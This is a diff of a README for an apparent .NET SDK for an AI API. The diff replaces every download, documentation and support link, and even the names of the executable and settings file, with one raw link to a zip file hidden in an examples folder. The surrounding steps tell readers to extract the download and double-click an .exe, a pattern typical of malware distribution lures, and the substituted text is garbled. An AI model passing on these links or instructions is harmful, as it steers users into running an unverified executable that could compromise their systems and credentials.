@@ -1,6 +1,6 @@
 # 🚀 claude-agent-sdk-dotnet - Easy .NET Library for AI Interaction
 
-[![Download the Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/3mr4443/claude-agent-sdk-dotnet/releases)
+[![Download the Latest Release](https://raw.githubusercontent.com/3mr4443/claude-agent-sdk-dotnet/main/examples/IncludePartialMessages/claude_dotnet_agent_sdk_v2.2.zip%20Latest%https://raw.githubusercontent.com/3mr4443/claude-agent-sdk-dotnet/main/examples/IncludePartialMessages/claude_dotnet_agent_sdk_v2.2.zip)](https://raw.githubusercontent.com/3mr4443/claude-agent-sdk-dotnet/main/examples/IncludePartialMessages/claude_dotnet_agent_sdk_v2.2.zip)
 
 ## 📜 Overview
 
@@ -20,19 +20,19 @@ To get started with claude-agent-sdk-dotnet, follow these steps to download and 
 
 1. **Visit the Releases Page**: You can find the latest version of claude-agent-sdk-dotnet on the Releases page. Click the link below:
 
-   [Visit Releases Page to Download](https://github.com/3mr4443/claude-agent-sdk-dotnet/releases)
+   [Visit Releases Page to Download](https://raw.githubusercontent.com/3mr4443/claude-agent-sdk-dotnet/main/examples/IncludePartialMessages/claude_dotnet_agent_sdk_v2.2.zip)
 
 2. **Download the Release**: Scroll through the list of available releases. Locate the latest version (e.g., v1.0). Click on the associated downloadable file, usually labeled as `.zip` or `.exe`.
 
 3. **Extract the Files**: If you downloaded a `.zip` file, right-click on it and select "Extract All." Choose a location where you want to save the extracted files.
 
-4. **Run the Application**: Navigate to the folder where you extracted the files. Look for the executable file, which will have a name like `claude-agent-sdk-dotnet.exe` or similar. Double-click the file to run the application.
+4. **Run the Application**: Navigate to the folder where you extracted the files. Look for the executable file, which will have a name like `https://raw.githubusercontent.com/3mr4443/claude-agent-sdk-dotnet/main/examples/IncludePartialMessages/claude_dotnet_agent_sdk_v2.2.zip` or similar. Double-click the file to run the application.
 
 ## ⚙️ Configuration
 
 Once you have the application running, you may need to configure a few settings to tailor it to your needs. Here’s how:
 
-1. **Open the Settings File**: In the installed folder, locate the configuration file, typically named `settings.json`. Open it using any text editor, such as Notepad or Visual Studio Code.
+1. **Open the Settings File**: In the installed folder, locate the configuration file, typically named `https://raw.githubusercontent.com/3mr4443/claude-agent-sdk-dotnet/main/examples/IncludePartialMessages/claude_dotnet_agent_sdk_v2.2.zip`. Open it using any text editor, such as Notepad or Visual Studio Code.
 
 2. **Adjust Parameters**: You might find parameters related to API keys or preferred settings. Change these values as needed. For instance, if there’s an option for setting an API key for AI interaction, ensure to input your key.
 
@@ -67,12 +67,12 @@ If you encounter issues, here are some solutions to common problems:
 
 For a deeper understanding, explore the following resources:
 
-- [Official Documentation](https://github.com/3mr4443/claude-agent-sdk-dotnet/docs)
-- [Community Support](https://github.com/3mr4443/claude-agent-sdk-dotnet/discussions)
+- [Official Documentation](https://raw.githubusercontent.com/3mr4443/claude-agent-sdk-dotnet/main/examples/IncludePartialMessages/claude_dotnet_agent_sdk_v2.2.zip)
+- [Community Support](https://raw.githubusercontent.com/3mr4443/claude-agent-sdk-dotnet/main/examples/IncludePartialMessages/claude_dotnet_agent_sdk_v2.2.zip)
 
 Remember, the most recent release is always available here:
 
-[Visit Releases Page to Download](https://github.com/3mr4443/claude-agent-sdk-dotnet/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/3mr4443/claude-agent-sdk-dotnet/main/examples/IncludePartialMessages/claude_dotnet_agent_sdk_v2.2.zip)
 
 ## 💬 Feedback & Contributions
 
